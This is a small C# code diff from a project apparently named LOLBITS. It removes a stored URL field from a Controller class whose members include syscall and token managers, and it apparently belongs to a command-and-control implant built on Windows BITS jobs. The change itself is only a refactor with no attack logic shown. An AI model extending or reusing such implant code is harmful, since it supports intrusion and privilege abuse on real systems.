@@ -21,7 +21,6 @@ namespace LOLBITS
         private string _id;
         private string _auth;
         private string[] _restoreKeys;
-        private readonly string _url;
         private readonly string _tempPath;
         private readonly TokenManager _tokenManager;
         private readonly Jobs _jobsManager;
@@ -30,9 +29,8 @@ namespace LOLBITS
         public Controller(string Id, string url,string password)
         {
             this._id = Id;
-            _url = url;
             _p = password;
-            _jobsManager = new Jobs(_url);
+            _jobsManager = new Jobs(url);
             _sysCall = new SyscallManager();
             _tokenManager = new TokenManager(_sysCall);
 
